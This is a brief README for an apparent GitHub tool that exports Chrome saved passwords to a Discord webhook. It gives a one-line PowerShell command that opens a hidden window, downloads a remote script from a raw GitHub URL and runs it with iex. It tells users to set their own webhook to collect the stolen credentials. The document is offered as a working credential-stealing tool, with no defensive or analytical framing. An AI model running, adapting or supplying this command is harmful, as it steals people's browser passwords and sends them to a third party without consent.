Simple Script to Export Chrome Passwords to Discord Webhook

To Use for Yourself, Fork Repo, edit cp.ps1 file to have your webhook URL, and edit command to include your cp.ps1 raw URL

Example CMD to Run:

```
powershell -Command "Start-Process powershell -ArgumentList '-Command & {iwr -Uri \"https://raw.githubusercontent.com/ishan211/Chrome-Discord-WH/main/cp.ps1\" -UseBasicParsing | iex}' -WindowStyle Hidden"
```
